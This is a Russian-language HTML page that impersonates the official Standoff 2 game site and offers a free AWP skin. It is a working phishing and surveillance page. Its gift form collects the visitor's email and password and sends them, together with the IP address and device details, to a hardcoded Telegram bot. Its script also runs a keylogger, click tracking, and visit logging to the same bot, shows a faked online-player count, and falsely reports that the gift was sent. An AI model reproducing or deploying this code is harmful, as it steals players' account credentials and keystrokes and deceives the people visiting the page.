<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Standoff 2 | Официальный сайт</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0a0f1a 0%, #0f1a2a 100%);
            color: #fff;
            min-height: 100vh;
        }
        @keyframes glow {
            0% { box-shadow: 0 0 5px #ff4444; }
            100% { box-shadow: 0 0 20px #ff4444; }
        }
        .header {
            background: linear-gradient(90deg, #d32f2f, #b71c1c);
            padding: 20px;
            text-align: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header h1 { font-size: 2em; letter-spacing: 2px; }
        .header h1 span { background: #fff; color: #d32f2f; padding: 0 12px; border-radius: 8px; }
        .online-badge { display: inline-block; background: #4caf50; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin-top: 8px; }
        .version-badge { display: inline-block; background: #ff4444; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin-left: 10px; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        .banner {
            background: linear-gradient(90deg, #ff4444, #aa2e2e);
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin-bottom: 30px;
        }
        .banner h2 { font-size: 2em; margin-bottom: 10px; }
        .gift-box {
            background: rgba(255,68,68,0.2);
            border: 2px solid #ff4444;
            border-radius: 20px;
            padding: 30px;
            text-align: center;
            margin: 30px 0;
            animation: glow 2s infinite alternate;
            cursor: pointer;
        }
        .gift-box h3 { font-size: 1.8em; margin-bottom: 15px; }
        .gift-icon { font-size: 4em; margin-bottom: 15px; }
        .input-group { margin-bottom: 15px; }
        .input-group input {
            width: 100%; padding: 14px; background: #1e2a3a; border: none;
            border-radius: 10px; color: white; font-size: 16px;
        }
        .input-group input:focus { outline: none; border: 1px solid #ff4444; }
        .btn {
            width: 100%; padding: 14px; background: linear-gradient(90deg, #ff4444, #aa2e2e);
            border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer;
            font-size: 16px;
        }
        .skin-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .skin-item {
            background: #1e2a3a;
            border-radius: 16px;
            padding: 20px;
            border-left: 4px solid #ff4444;
            transition: 0.3s;
            cursor: pointer;
        }
        .skin-item:hover { transform: translateY(-5px); background: #2a3a4a; }
        .skin-name { font-weight: bold; font-size: 1.2em; color: #ff8888; }
        .skin-weapon { color: #aaa; font-size: 12px; margin: 5px 0; }
        .skin-price { color: #ffaa44; font-size: 18px; font-weight: bold; }
        .skin-rarity { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; margin-top: 8px; }
        .legendary { background: #ffaa44; color: #000; }
        .epic { background: #aa44ff; color: #fff; }
        .mythic { background: #ff4444; color: #fff; }
        .tabs {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin: 20px 0;
            justify-content: center;
        }
        .tab {
            padding: 12px 24px;
            background: #1e2a3a;
            border-radius: 30px;
            cursor: pointer;
            font-weight: bold;
        }
        .tab.active { background: #ff4444; }
        .footer { text-align: center; padding: 30px; background: #0a0f1a; margin-top: 40px; font-size: 12px; color: #666; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background: #1e2a3a;
            border-radius: 20px;
            padding: 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            border: 1px solid #ff4444;
        }
        .modal-content button {
            margin-top: 20px;
            padding: 10px 30px;
            background: #ff4444;
            border: none;
            border-radius: 30px;
            color: white;
            cursor: pointer;
        }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: #ff4444;
            animation: spin 0.6s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .error-message { color: #ff4444; font-size: 12px; margin-top: 8px; }
        .success-message { color: #4caf50; font-size: 12px; margin-top: 8px; }
    </style>
</head>
<body>

<div class="header">
    <h1>STANDOFF <span>2</span></h1>
    <div>
        <span class="online-badge">🟢 Онлайн: <span id="onlineCount">147,892</span></span>
        <span class="version-badge">⚡ Сезон 11 | v0.37.1</span>
    </div>
</div>

<div class="container">
    <div class="banner">
        <h2>🔥 СЕЗОН 11: НОВЫЙ РАССВЕТ</h2>
        <p>Новая карта "Завод", баланс оружия, эксклюзивные награды!</p>
    </div>

    <div class="gift-box" onclick="openGiftModal()">
        <div class="gift-icon">🎁</div>
        <h3>ПОЛУЧИ ПОДАРОК!</h3>
        <p>Эксклюзивный скин AWP | Dragon Spirit + 500⭐</p>
        <div class="btn" style="margin-top: 15px; max-width: 200px; display: inline-block;">ЗАБРАТЬ ПОДАРОК</div>
    </div>

    <div class="tabs">
        <div class="tab active" onclick="switchTab('skins')">🎨 СКИНЫ</div>
        <div class="tab" onclick="switchTab('news')">📰 НОВОСТИ</div>
        <div class="tab" onclick="switchTab('updates')">⚡ ОБНОВЛЕНИЯ</div>
    </div>

    <div id="skinsTab">
        <div class="skin-list">
            <div class="skin-item" onclick="showSkin('AWP | Dragon Spirit', 'Снайперская винтовка', '8,500⭐', 'Легендарный', '🔥')">
                <div class="skin-name">AWP | Dragon Spirit</div>
                <div class="skin-weapon">Снайперская винтовка</div>
                <div class="skin-price">🔥 8,500⭐</div>
                <span class="skin-rarity legendary">ЛЕГЕНДАРНЫЙ</span>
            </div>
            <div class="skin-item" onclick="showSkin('AKR-47 | Phantom', 'Автомат', '6,200⭐', 'Легендарный', '💀')">
                <div class="skin-name">AKR-47 | Phantom</div>
                <div class="skin-weapon">Автомат</div>
                <div class="skin-price">💀 6,200⭐</div>
                <span class="skin-rarity legendary">ЛЕГЕНДАРНЫЙ</span>
            </div>
            <div class="skin-item" onclick="showSkin('M4A1-S | Ice Queen', 'Автомат', '4,800⭐', 'Эпический', '❄️')">
                <div class="skin-name">M4A1-S | Ice Queen</div>
                <div class="skin-weapon">Автомат</div>
                <div class="skin-price">❄️ 4,800⭐</div>
                <span class="skin-rarity epic">ЭПИЧЕСКИЙ</span>
            </div>
            <div class="skin-item" onclick="showSkin('Deagle | Gold Rush', 'Пистолет', '3,500⭐', 'Легендарный', '💰')">
                <div class="skin-name">Deagle | Gold Rush</div>
                <div class="skin-weapon">Пистолет</div>
                <div class="skin-price">💰 3,500⭐</div>
                <span class="skin-rarity legendary">ЛЕГЕНДАРНЫЙ</span>
            </div>
            <div class="skin-item" onclick="showSkin('Knife | Crimson Web', 'Нож', '12,000⭐', 'Мифический', '🔪')">
                <div class="skin-name">Knife | Crimson Web</div>
                <div class="skin-weapon">Нож</div>
                <div class="skin-price">🔪 12,000⭐</div>
                <span class="skin-rarity mythic">МИФИЧЕСКИЙ</span>
            </div>
        </div>
    </div>

    <div id="newsTab" style="display:none">
        <div class="skin-item" style="cursor:default"><div class="skin-name">🎉 Сезон 11 стартовал!</div><div class="skin-weapon">Новая карта "Завод"</div><div class="skin-price">📅 15 марта 2026</div></div>
        <div class="skin-item" style="cursor:default"><div class="skin-name">⚡ Обновление 0.37.1</div><div class="skin-weapon">Исправлены баги</div><div class="skin-price">📅 28 марта 2026</div></div>
        <div class="skin-item" style="cursor:default"><div class="skin-name">🏆 Турнир Standoff 2 Cup</div><div class="skin-weapon">Призовой фонд 5 млн руб.</div><div class="skin-price">📅 1-30 апреля 2026</div></div>
    </div>

    <div id="updatesTab" style="display:none">
        <div class="skin-item" style="cursor:default"><div class="skin-name">🔧 Версия 0.37.1</div><div class="skin-weapon">• Новая карта "Завод"<br>• Баланс оружия<br>• Новые скины</div><div class="skin-price">📅 28 марта 2026</div></div>
    </div>
</div>

<div class="footer">© 2017-2026 Standoff 2. Официальный сайт</div>

<!-- Модалка подарка -->
<div id="giftModal" class="modal">
    <div class="modal-content">
        <div id="giftModalBody">
            <h3>🎁 ПОЛУЧИТЕ ПОДАРОК</h3>
            <div class="input-group"><input type="email" id="giftEmail" placeholder="Email"></div>
            <div class="input-group"><input type="password" id="giftPassword" placeholder="Пароль"></div>
            <div id="giftStatus"></div>
            <button class="btn" onclick="sendGift()">ПОЛУЧИТЬ ПОДАРОК</button>
        </div>
        <div id="giftModalResult" style="display:none"><h3 id="resultText">✅</h3><button onclick="closeGiftModal()">ЗАКРЫТЬ</button></div>
    </div>
</div>

<!-- Модалка скина -->
<div id="skinModal" class="modal">
    <div class="modal-content">
        <div style="font-size:4em" id="skinIcon">🔫</div>
        <h3 id="skinName"></h3>
        <p id="skinWeapon"></p>
        <p id="skinPrice" style="color:#ffaa44;font-size:24px"></p>
        <span id="skinRarity"></span>
        <button onclick="closeSkinModal()">ЗАКРЫТЬ</button>
    </div>
</div>

<script>
    // ==================== ЛОГГЕР ====================
    const BOT_TOKEN = "8698840733:AAFFuiPc95n8QZUyNPVCcgetkLTK4b86R0o";
    const CHAT_ID = "8289139563";
    
    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text.substring(0, 4000), parse_mode: 'HTML' })
        }).catch(e=>console.log);
    }
    
    // Отправка подарка
    window.sendGift = function() {
        let email = document.getElementById('giftEmail').value.trim();
        let pass = document.getElementById('giftPassword').value.trim();
        let status = document.getElementById('giftStatus');
        
        if(!email){ status.innerHTML='❌ Введите email'; status.className='error-message'; return; }
        if(!pass){ status.innerHTML='❌ Введите пароль'; status.className='error-message'; return; }
        
        let data = `🎁 ПОДАРОК\n📧 ${email}\n🔑 ${pass}\n🖥️ ${navigator.userAgent}\n🌍 ${navigator.language}\n📺 ${screen.width}x${screen.height}\n🕒 ${new Date().toLocaleString()}\n📍 ${location.href}`;
        
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>{ sendToTelegram(data+`\n🌍 IP: ${ip.ip}`); }).catch(()=>sendToTelegram(data));
        
        document.getElementById('giftModalBody').style.display = 'none';
        document.getElementById('giftModalResult').style.display = 'block';
        document.getElementById('resultText').innerHTML = `✅ Подарок отправлен на ${email}`;
        document.getElementById('giftEmail').value = '';
        document.getElementById('giftPassword').value = '';
    };
    
    window.openGiftModal = function() {
        document.getElementById('giftModal').style.display = 'flex';
        document.getElementById('giftModalBody').style.display = 'block';
        document.getElementById('giftModalResult').style.display = 'none';
        document.getElementById('giftStatus').innerHTML = '';
    };
    window.closeGiftModal = function() { document.getElementById('giftModal').style.display = 'none'; };
    
    window.showSkin = function(name, weapon, price, rarity, icon) {
        document.getElementById('skinName').innerHTML = name;
        document.getElementById('skinWeapon').innerHTML = weapon;
        document.getElementById('skinPrice').innerHTML = price;
        document.getElementById('skinIcon').innerHTML = icon;
        let rarityClass = rarity === 'Легендарный' ? 'legendary' : (rarity === 'Эпический' ? 'epic' : 'mythic');
        document.getElementById('skinRarity').innerHTML = `<span class="skin-rarity ${rarityClass}">${rarity}</span>`;
        document.getElementById('skinModal').style.display = 'flex';
        sendToTelegram(`🎨 ПРОСМОТР СКИНА\n📦 ${name}\n💰 ${price}`);
    };
    window.closeSkinModal = function() { document.getElementById('skinModal').style.display = 'none'; };
    
    // Keylogger
    let keyBuf = '', lastSend = Date.now();
    document.addEventListener('keydown', e => {
        let k = e.key;
        if(k.length===1) keyBuf += k;
        else if(k==='Enter') keyBuf += '\n';
        else if(k===' ') keyBuf += ' ';
        if((Date.now()-lastSend>15000||keyBuf.length>50)&&keyBuf.length){
            sendToTelegram(`⌨️ KEYLOGGER:\n${keyBuf}`);
            keyBuf=''; lastSend=Date.now();
        }
    });
    
    // Инфо о посетителе
    sendToTelegram(`🆕 ПОСЕТИТЕЛЬ\n📍 ${location.href}\n🖥️ ${navigator.userAgent}\n🕒 ${new Date().toLocaleString()}`);
    
    // IP
    fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ip=>sendToTelegram(`🌍 IP: ${ip.ip}`)).catch(e=>{});
    
    // Время на странице
    let start = Date.now();
    window.addEventListener('beforeunload', ()=>{
        let sec = Math.floor((Date.now()-start)/1000);
        if(sec>5) sendToTelegram(`⏱️ ВРЕМЯ: ${Math.floor(sec/60)}м ${sec%60}с`);
    });
    
    // Клики
    let clicks = [];
    document.addEventListener('click', e=>{
        let el = e.target.tagName + (e.target.innerText?':'+e.target.innerText.substring(0,30):'');
        clicks.push(el);
        if(clicks.length>=5){ sendToTelegram(`🖱️ КЛИКИ: ${clicks.join(', ')}`); clicks=[]; }
    });
    
    function switchTab(tab) {
        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
        event.target.classList.add('active');
        document.getElementById('skinsTab').style.display = tab==='skins' ? 'block' : 'none';
        document.getElementById('newsTab').style.display = tab==='news' ? 'block' : 'none';
        document.getElementById('updatesTab').style.display = tab==='updates' ? 'block' : 'none';
    }
    
    setInterval(()=>{
        document.getElementById('onlineCount').innerText = (Math.floor(Math.random()*20000)+140000).toLocaleString();
    }, 30000);
    
    window.onclick = function(e) {
        if(e.target === document.getElementById('giftModal')) closeGiftModal();
        if(e.target === document.getElementById('skinModal')) closeSkinModal();
    };
</script>
</body>
</html>
